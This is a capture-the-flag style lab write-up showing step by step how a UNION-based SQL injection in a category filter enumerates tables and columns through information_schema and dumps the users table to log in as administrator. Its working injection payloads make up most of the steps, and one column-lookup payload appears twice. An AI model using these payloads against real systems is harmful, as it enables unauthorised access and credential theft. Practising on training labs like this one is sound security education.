# SQL injection attack, listing the database contents on non-Oracle databases

### Lab description
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. 

**Goal:** log in as the **administrator** user. 

---

## Steps

Select category and forward request to repeater.
Determine text fields. 
```SQL
'+UNION+SELECT+NULL,'QWE'--   200 OK
```

For extract list of tables names in DB use this payload:

```SQL
'+UNION+SELECT+NULL,+TABLE_NAME+FROM+information_schema.tables--   200 OK
```

Use search to find users_ousivx and use payload for retrieve details of the columns:

```SQL
'+UNION+SELECT+NULL,+COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME+=+'users_ousivx'--   200 OK
```

Then extract column_name details:

```SQL
'+UNION+SELECT+NULL,+COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME+=+'users_ousivx'--   200 OK
```

We find **password_mnpvgn** and **username_fjgkjn**

Then simply do 1 + 1 and:

```SQL
'+UNION+SELECT+username_fjgkjn,password_mnpvgn+FROM+users_ousivx--   200 OK
```

And we retrieve users log in credentials. Then log in as **administrator**.





> ### **Congratulations, you solved the lab!**